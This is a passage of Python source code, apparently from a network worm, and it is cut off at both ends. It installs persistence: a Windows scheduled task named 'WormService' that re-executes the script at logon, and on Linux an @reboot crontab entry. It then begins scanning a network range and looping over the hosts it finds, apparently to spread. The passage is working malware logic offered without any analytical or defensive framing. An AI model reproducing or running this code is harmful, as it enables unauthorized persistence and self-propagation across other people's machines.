        system = platform.system()
        if system == "Windows":
            service_name = "WormService"
            service_command = f'schtasks /create /tn {service_name} /tr "cmd.exe /c pythonw -c import sys; exec(sys.stdin.read()) < {__file__}" /sc onlogon'
        elif system == "Linux":
            service_name = "worm"
            service_command = f'echo "@reboot python3 {__file__}" | crontab -'
        else:
            print("Unsupported operating system")
            return
        
        os.system(service_command)
    
    # Main logic
    clients = scan_network(network_range)
    for client in clients:
